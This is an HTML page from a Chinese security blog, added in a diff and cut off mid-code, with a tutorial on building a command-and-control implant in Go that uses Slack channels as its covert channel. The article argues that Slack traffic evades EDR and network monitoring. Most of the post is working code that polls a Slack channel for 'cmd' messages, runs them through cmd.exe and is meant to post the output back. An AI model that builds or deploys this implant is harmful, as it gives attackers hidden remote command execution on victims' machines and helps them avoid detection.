@@ -1,0 +1,1137 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="windows,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="keywords" content="windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="slack C2 golang编写(T1102)">
+<meta property="og:url" content="www.ggsec.cn/slack C2 golang.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-11.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-1.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-2.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-4.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-3.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-5.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-6.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-7.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-8.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-9.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-10.png">
+<meta property="og:updated_time" content="2020-09-22T13:02:36.131Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="slack C2 golang编写(T1102)">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> slack C2 golang编写(T1102) | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              slack C2 golang编写(T1102)
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2020-08-22T21:45:23+08:00" content="2020-08-22">
+            2020-08-22
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/windows/" itemprop="url" rel="index">
+                  <span itemprop="name">windows</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/slack C2 golang.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="slack C2 golang.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/slack C2 golang.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg" alt="enter description here"></p>
+<a id="more"></a>
+<h3 id="1-slack简介"><a href="#1-slack简介" class="headerlink" title="1.slack简介"></a>1.slack简介</h3><p> Slack 是聊天群组 + 大规模工具集成 + 文件整合 + 统一搜索。截至2014年底，Slack 已经整合了电子邮件、短信、Google Drives、Twitter、Trello、Asana、GitHub 等 65 种工具和服务，可以把各种碎片化的企业沟通和协作集中到一起 。</p>
+<h3 id="2-slackC2"><a href="#2-slackC2" class="headerlink" title="2.slackC2"></a>2.slackC2</h3><p>​       因前阵子正好在找资料的时候发现一篇文章“ <strong>SLUB最新变种分析：仅靠 Slack进行C2通信”</strong> ，感觉还是比较有意思的，所以抽空打算做下实验对其记录下。</p>
+<p>​      思路其实大同小异，也是差不多可以借鉴参考开源的代码。<code>https://github.com/bkup/SlackShell</code></p>
+<p>​      一旦公开了此功能，它便受到了许多恶意软件创建者的欢迎，因为它提供了利用现有平台的好处。攻击者无需闯入Slack，他们只需使用其功能来控制植入到公司网络中的恶意软件即可。更重要的是，这种Slack作为通信渠道的合法使用将使黑客避免使用传统的安全机制（例如EDR和数据包捕获NTA）进行检测。Slack API URL结构也将被证明是对安全机制的检测挑战。所有Slack API URL的格式都与<a href="https://slack.com/api/[METHOD" target="_blank" rel="noopener">https://slack.com/api/[METHOD</a> ] 相同 ，这意味着未加密的DNS查询仅显示slack.com的分辨率，这使得将Slack API的使用与正常的网络浏览区分开来非常困难。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-11.png" alt="11"></p>
+<p>​     恶意软件创建者可能会使用Slack作为主要或辅助C2渠道，并使用其他平台（如Github）进行备份。由于这些应用程序是合法的，并且经常用于移动文件，因此防病毒或终结点解决方案几乎不会检测到恶意代码的渗透或敏感数据的泄漏的风险。尽管使用通用应用程序的概念并不是什么新鲜事（通过将Twitter用作C2渠道，尤其是<a href="https://web.archive.org/web/20100516175402/http:/sunbeltblog.blogspot.com/2010/05/diy-twitter-botnet-creator.html" target="_blank" rel="noopener">Twitter bot构建器</a>，已经进行了较早的尝试 ），但Slack的普遍采用将这种操作方法提升到了一个全新的水平。</p>
+<p>​     这个新发现的沟通渠道是黑客与防御者之间战斗的又一步。它着重说明了需要利用基于机器的群集分析的安全工具，以提供更多有关行为的信息，以揭示整个攻击范围。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-1.png" alt="1"></p>
+<h3 id="3-客户端poc功能思路编写"><a href="#3-客户端poc功能思路编写" class="headerlink" title="3.客户端poc功能思路编写"></a>3.客户端poc功能思路编写</h3><p>1.服务端指定频道发送命令，由客户端接收</p>
+<p>2.客户端接收服务端接收指令，执行命令</p>
+<p>3.客户端执行结果，返回传送给服务端。</p>
+<p>4.指定服务端命令标识，让客户端判定是否为命令</p>
+<p>条件（指定频道、slack token和slack api）</p>
+<p>Slack API 整理（发送信息，频道信息接收）</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-2.png" alt="2"></p>
+<h3 id="4-API测试"><a href="#4-API测试" class="headerlink" title="4.API测试"></a>4.API测试</h3><p>以下为slack 官方API 测试地址</p>
+<p> <a href="https://api.slack.com/methods/chat.postMessage" target="_blank" rel="noopener">https://api.slack.com/methods/chat.postMessage</a> </p>
+<p> <a href="https://api.slack.com/methods/conversations.history" target="_blank" rel="noopener">https://api.slack.com/methods/conversations.history</a> </p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-4.png" alt="4"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-3.png" alt="3"></p>
+<p>另外我们需要几个参数 一个为token，另一个为channel</p>
+<p>那么channel可以在 <a href="https://app.slack.com/client/TMFHAPNTS/xxxxx，登录后找的ID" target="_blank" rel="noopener">https://app.slack.com/client/TMFHAPNTS/xxxxx，登录后找的ID</a></p>
+<p>而token 可在 <a href="https://api.slack.com/legacy/custom-integrations/legacy-tokens" target="_blank" rel="noopener">https://api.slack.com/legacy/custom-integrations/legacy-tokens</a>  中获取</p>
+<p><strong>发送频道信息</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-5.png" alt="5"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-6.png" alt="6"></p>
+<p><strong>查询频道信息</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-7.png" alt="7"></p>
+<h3 id="5-golang功能编写"><a href="#5-golang功能编写" class="headerlink" title="5.golang功能编写"></a>5.golang功能编写</h3><h4 id="5-1-打印频道信息"><a href="#5-1-打印频道信息" class="headerlink" title="5.1 打印频道信息"></a>5.1 打印频道信息</h4><p>首先定义API、tokon、频道信息</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	History_api = <span class="string">"https://slack.com/api/conversations.history"</span></span><br><span class="line">	PostMessage = <span class="string">"https://slack.com/api/chat.postMessage"</span></span><br><span class="line">	Token       = <span class="string">"xoxp-729588xxxxxxx"</span></span><br><span class="line">	Channel     = <span class="string">"xxxxxx"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>然后再定义中文编码的问题</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"golang.org/x/text/encoding/simplifiedchinese"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Charset <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	UTF8    = Charset(<span class="string">"UTF-8"</span>)</span><br><span class="line">	GB18030 = Charset(<span class="string">"GB18030"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertByte2String</span><span class="params">(<span class="keyword">byte</span> []<span class="keyword">byte</span>, charset Charset)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> str <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">switch</span> charset &#123;</span><br><span class="line">	<span class="keyword">case</span> GB18030:</span><br><span class="line">		<span class="keyword">var</span> decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(<span class="keyword">byte</span>)</span><br><span class="line">		str = <span class="keyword">string</span>(decodeBytes)</span><br><span class="line">	<span class="keyword">case</span> UTF8:</span><br><span class="line">		<span class="keyword">fallthrough</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		str = <span class="keyword">string</span>(<span class="keyword">byte</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面开始定义main函数的内容</p>
+<p><strong>指定频道和token 查看频道的信息</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(<span class="string">"GET"</span>, utils.History_api, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	log.Print(err)</span><br><span class="line">	os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// GET URL  获取频道的字符串内容</span></span><br><span class="line">q := req.URL.Query()</span><br><span class="line">q.Add(<span class="string">"token"</span>, utils.Token)</span><br><span class="line">q.Add(<span class="string">"channel"</span>, utils.Channel)</span><br><span class="line">q.Add(<span class="string">"pretty"</span>, <span class="string">"1"</span>)</span><br><span class="line">req.URL.RawQuery = q.Encode()</span><br><span class="line"><span class="keyword">var</span> resp *http.Response</span><br><span class="line">resp, err = http.DefaultClient.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	log.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// fmt.Println(url)</span></span><br><span class="line"><span class="comment">//defer resp.Body.Close()</span></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="comment">// handle error</span></span><br><span class="line">&#125;</span><br><span class="line">json := <span class="keyword">string</span>(body)</span><br><span class="line"><span class="comment">//将GET URL 中的json值赋值给json变量</span></span><br><span class="line"></span><br><span class="line">text := gjson.Get(json, <span class="string">"messages.0.text"</span>)</span><br><span class="line">fmt.Print(text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-8.png" alt="8"></p>
+<h4 id="5-2-发送信息给频道"><a href="#5-2-发送信息给频道" class="headerlink" title="5.2 发送信息给频道"></a>5.2 发送信息给频道</h4><p><strong>使用post 传参发送hello,i am xxxx指定频道</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(<span class="string">"POST"</span>, utils.PostMessage, <span class="literal">nil</span>)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					log.Print(err)</span><br><span class="line">					os.Exit(<span class="number">1</span>)</span><br><span class="line">				&#125;</span><br><span class="line">				p := req.URL.Query()</span><br><span class="line">				p.Add(<span class="string">"token"</span>, utils.Token)</span><br><span class="line">				p.Add(<span class="string">"channel"</span>, utils.Channel)</span><br><span class="line">				p.Add(<span class="string">"pretty"</span>, <span class="string">"1"</span>)</span><br><span class="line">				p.Add(<span class="string">"text"</span>, <span class="string">"hello,i am xxxx"</span>)</span><br><span class="line">				req.URL.RawQuery = p.Encode()</span><br><span class="line">				<span class="keyword">var</span> resp *http.Response</span><br><span class="line">				resp, err = http.DefaultClient.Do(req)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					log.Print(err)</span><br><span class="line">				&#125;</span><br><span class="line">				body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					<span class="comment">// handle error</span></span><br><span class="line">				&#125;</span><br><span class="line">				postMessage := <span class="keyword">string</span>(body)</span><br><span class="line">				OUTPUT := gjson.Get(postMessage, <span class="string">"message.0"</span>)</span><br><span class="line">				log.Println(OUTPUT)</span><br><span class="line">				<span class="comment">//fmt.Println()用于将输出的结果返回到slack频道中</span></span><br><span class="line">				resp.Body.Close()</span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-9.png" alt="9"></p>
+<h4 id="5-3指定命令标识"><a href="#5-3指定命令标识" class="headerlink" title="5.3指定命令标识"></a>5.3指定命令标识</h4><p>指定服务端命令标识，让客户端判定是否为命令</p>
+<p>思路为，获取频道信息的字符串，如果发送过来的标识为<strong>”cmd  xxxxx“</strong>，则为执行命令，如果不是，则跳过。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">text := gjson.Get(json, <span class="string">"messages.0.text"</span>)</span><br><span class="line">		<span class="comment">// fmt.Print(text)</span></span><br><span class="line">		cmd := strings.Split(text.String(), <span class="string">" "</span>)</span><br><span class="line">		m := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">//定义列表命令</span></span><br><span class="line">			<span class="string">"cmd"</span>: &#123;&#125;,</span><br><span class="line">		&#125;</span><br><span class="line">		cmdlist := cmd[<span class="number">0</span>] <span class="comment">//slack频道输出的字符串第一个元素如果是列表中的就执行以下内容</span></span><br><span class="line">		<span class="comment">// fmt.Println(cmd[1])</span></span><br><span class="line">		<span class="keyword">if</span> _, run := m[cmdlist]; run &#123;</span><br><span class="line">			<span class="keyword">if</span> cmdlist == <span class="string">"cmd"</span> &#123;</span><br><span class="line">				<span class="comment">//判断接受过来的字符第一个元素是否为cmd字符串，【用于执行命令】</span></span><br><span class="line">				<span class="comment">// if runtime.GOOS == "windows" &#123;</span></span><br><span class="line">				command := exec.Command(<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd[<span class="number">1</span>])</span><br><span class="line">				<span class="comment">// &#125; else &#123;</span></span><br><span class="line">				<span class="comment">// 	command := exec.Command(cmd[1])</span></span><br><span class="line">				<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">				<span class="comment">//取值为第二元素为服务端接受的命令，并执行命令</span></span><br><span class="line">				stdoutStderr, err := command.CombinedOutput()</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					log.Fatal(err)</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="完整效果"><a href="#完整效果" class="headerlink" title="完整效果"></a>完整效果</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200920-10.png" alt="10"></p>
+<h3 id="6-完整代码"><a href="#6-完整代码" class="headerlink" title="6.完整代码"></a>6.完整代码</h3><p><strong>utils.go</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"golang.org/x/text/encoding/simplifiedchinese"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Charset <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	UTF8    = Charset(<span class="string">"UTF-8"</span>)</span><br><span class="line">	GB18030 = Charset(<span class="string">"GB18030"</span>)</span><br><span class="line">	History_api = <span class="string">"https://slack.com/api/conversations.history"</span></span><br><span class="line">	PostMessage = <span class="string">"https://slack.com/api/chat.postMessage"</span></span><br><span class="line">	Token       = <span class="string">"xoxp-729588xxxxxxx"</span></span><br><span class="line">	Channel     = <span class="string">"xxxxxx"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertByte2String</span><span class="params">(<span class="keyword">byte</span> []<span class="keyword">byte</span>, charset Charset)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> str <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">switch</span> charset &#123;</span><br><span class="line">	<span class="keyword">case</span> GB18030:</span><br><span class="line">		<span class="keyword">var</span> decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(<span class="keyword">byte</span>)</span><br><span class="line">		str = <span class="keyword">string</span>(decodeBytes)</span><br><span class="line">	<span class="keyword">case</span> UTF8:</span><br><span class="line">		<span class="keyword">fallthrough</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		str = <span class="keyword">string</span>(<span class="keyword">byte</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> str</span><br><span 